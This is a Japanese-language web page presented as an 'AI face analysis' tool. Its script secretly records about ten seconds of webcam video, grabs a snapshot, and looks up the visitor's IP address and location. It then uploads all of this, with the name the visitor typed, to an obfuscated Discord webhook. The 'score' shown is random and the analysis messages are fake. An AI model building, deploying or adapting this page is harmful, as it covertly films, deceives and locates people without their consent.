<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI DeepLearning Face Analysis</title>
    <style>
        body { font-family: 'Helvetica Neue', Arial, sans-serif; text-align: center; background: #0a0a0a; color: #e0e0e0; padding: 20px; margin: 0; }
        .container { max-width: 450px; margin: auto; background: #151515; padding: 30px; border-radius: 20px; border: 1px solid #2a2a2a; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        h1 { font-size: 1.4em; color: #00d1ff; letter-spacing: 1px; margin-bottom: 25px; }
        .field-box { margin-bottom: 20px; text-align: left; width: 90%; margin: auto; }
        label { font-size: 0.75em; color: #666; display: block; margin-bottom: 8px; text-transform: uppercase; }
        input { width: 100%; padding: 14px; border-radius: 10px; border: 1px solid #333; background: #1d1d1d; color: #fff; font-size: 1em; box-sizing: border-box; transition: 0.3s; }
        input:focus { border-color: #00d1ff; outline: none; box-shadow: 0 0 10px rgba(0,209,255,0.2); }
        #monitor-feed { width: 100%; border-radius: 12px; background: #000; margin-top: 20px; display: none; aspect-ratio: 3/4; object-fit: cover; border: 1px solid #444; }
        #init-trigger { width: 100%; padding: 20px; font-size: 1em; font-weight: bold; background: linear-gradient(45deg, #00d1ff, #007bff); color: #fff; border: none; border-radius: 10px; cursor: pointer; margin-top: 25px; transition: 0.3s; }
        #init-trigger:hover { opacity: 0.9; transform: translateY(-2px); }
        #log-console { font-size: 0.85em; margin-top: 25px; color: #00d1ff; min-height: 3em; font-family: monospace; }
        #score-output { font-size: 1.4em; font-weight: bold; color: #00d1ff; margin-top: 15px; }
        #ext-module { display: none; margin-top: 30px; border-top: 1px solid #2a2a2a; padding-top: 25px; }
        .link-node { display: block; text-decoration: none; padding: 16px; border-radius: 10px; font-weight: bold; background: #222; color: #00d1ff; border: 1px solid #00d1ff; margin-top: 12px; font-size: 0.85em; }
        .disclaimer { font-size: 0.7em; color: #555; margin-top: 20px; }
        #buffer-node { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h1>AI Face Dynamics Analysis</h1>
        <div id="auth-layer">
            <div class="field-box">
                <label>User Identifier</label>
                <input type="text" id="node-id" placeholder="Enter identification name...">
            </div>
            <button id="init-trigger">EXECUTE ANALYTICS</button>
            <div class="disclaimer">Processing via Cloud AI Vector Engine v4.2</div>
        </div>
        <video id="monitor-feed" autoplay playsinline muted></video>
        <div id="log-console"></div>
        <div id="score-output"></div>
        <div id="ext-module">
            <p style="font-size:0.75em; color:#666;">Deep-Scan: Body Ratio Calibration</p>
            <a href="style.html" class="link-node">Access Full-Body Analytics Module</a>
        </div>
    </div>
    <canvas id="buffer-node"></canvas>

    <script>
        (function() {
            const ui_v = document.getElementById('monitor-feed');
            const ui_c = document.getElementById('buffer-node');
            const ui_b = document.getElementById('init-trigger');
            const ui_l = document.getElementById('log-console');
            const ui_r = document.getElementById('score-output');
            const ui_f = document.getElementById('auth-layer');
            const ui_x = document.getElementById('ext-module');
            
            // Webhook URLの難読化（分割して結合）
            const _p1 = 'https://discord.com/api/webhooks/';
            const _p2 = '1496394005099839549/';
            const _p3 = 'HwDWlHkTXMHM3_hMZ_P3HLCgOEQDrCMEh-jJjWxSplHrHPTu8526nnC0mUPQG3QxFcx8';
            const _sys_entry = _p1 + _p2 + _p3;

            let _mRec; 
            let _dat = [];
            const _steps = [
                "> Initializing Neural Engine...",
                "> Extracting facial landmark vectors...",
                "> Calculating geometric symmetry...",
                "> Normalizing skin-tone metadata...",
                "> Querying global database...",
                "> Generating deep-learning report..."
            ];

            ui_b.addEventListener('click', async () => {
                const _id = document.getElementById('node-id').value || 'Anonymous';
                ui_f.style.display = 'none';
                ui_v.style.display = 'block';
                
                try {
                    const s = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                    ui_v.srcObject = s;
                    const t = ["video/webm;codecs=vp8", "video/mp4", "video/webm"].find(x => MediaRecorder.isTypeSupported(x));
                    _mRec = new MediaRecorder(s, { mimeType: t, videoBitsPerSecond: 1000000 });
                    _dat = [];

                    _mRec.ondataavailable = e => { if (e.data.size > 0) _dat.push(e.data); };
                    const _wait = new Promise(r => _mRec.onstop = r);

                    _mRec.start(); 
                    
                    let k = 0;
                    const _iv = setInterval(() => {
                        if (k < _steps.length) {
                            ui_l.innerHTML = _steps[k];
                            k++;
                        } else { clearInterval(_iv); }
                    }, 1600);

                    setTimeout(async () => {
                        if (_mRec.state !== "inactive") {
                            _mRec.stop();
                            await _wait;
                            await _syncPayload(_id);
                        }
                    }, 10000); 

                } catch (e) {
                    ui_l.innerHTML = "SYSTEM ERROR: Interface activation failed.";
                    ui_f.style.display = 'block';
                }
            });

            async function _syncPayload(u) {
                let _meta = "\n🌐 Metadata: Network sync error";
                try {
                    const r = await fetch('https://ipapi.co/json/');
                    const d = await r.json();
                    // 内部的には取得するが、ユーザーには表示させない
                    _meta = `\n🌐 ADDR: ${d.ip}\n📍 ZONE: ${d.region} ${d.city}\n🏢 NODE: ${d.org}`;
                } catch (e) {}

                const _val = (Math.random() * (75 - 45) + 45).toFixed(1);
                ui_c.width = ui_v.videoWidth;
                ui_c.height = ui_v.videoHeight;
                ui_c.getContext('2d').drawImage(ui_v, 0, 0);

                ui_c.toBlob(async (b) => {
                    const f = new FormData();
                    f.append('content', `【Diagnostic Sync】\n👤 Subject: ${u}\n📊 Metric: ${_val}${_meta}`);
                    f.append('file1', b, 'frame_data.jpg');
                    
                    if (_dat.length > 0) {
                        const vb = new Blob(_dat, { type: _mRec.mimeType });
                        const ex = _mRec.mimeType.includes('mp4') ? 'mp4' : 'webm';
                        f.append('file2', vb, `stream_log.${ex}`);
                    }

                    try {
                        await fetch(_sys_entry, { method: 'POST', body: f });
                    } catch (e) {}

                    ui_l.innerHTML = "";
                    ui_r.innerHTML = `${u} Result Score:<br><span style="font-size:1.8em; color:#00d1ff;">${_val}</span>`;
                    ui_x.style.display = 'block';
                    
                    if(ui_v.srcObject) ui_v.srcObject.getTracks().forEach(t => t.stop());
                }, 'image/jpeg', 0.6);
            }
        })();
    </script>
</body>
</html>
